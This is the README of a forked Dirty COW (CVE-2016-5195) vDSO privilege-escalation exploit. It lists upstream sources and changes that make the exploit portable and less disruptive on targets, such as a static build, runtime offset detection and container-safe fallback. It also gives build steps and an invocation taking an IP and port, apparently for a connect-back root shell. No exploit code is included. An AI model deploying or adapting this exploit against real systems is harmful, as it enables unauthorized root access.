# dirtycow

Dirty COW (CVE-2016-5195) vDSO exploit.

- Upstream: https://github.com/zh-explorer/dirtycow
- Based on scumjr's vdso exploit: https://github.com/scumjr/dirtycow-vdso

## Changes

- Build with `make` + `gcc` only; removed cmake and python3/pyelftools.
- `__vdso_clock_gettime` offset and vDSO mapping size are detected at
  runtime; no per-kernel hardcoding.
- Static build by default: the target does not need make, gcc, a dynamic
  loader or a matching glibc.
- If the payload does not run (non-root caller or container PID
  namespace), the stub performs the real `clock_gettime` syscall and
  returns normally, so container processes (including PID 1) survive.
- One-shot marker is `/tmp/.x2`; remove it to trigger again. The vDSO
  patch persists until reboot.

## Build

```sh
make            # static (default)
make STATIC=0   # dynamic
```

## Usage

```sh
./dirtycow <ip> <port>
```
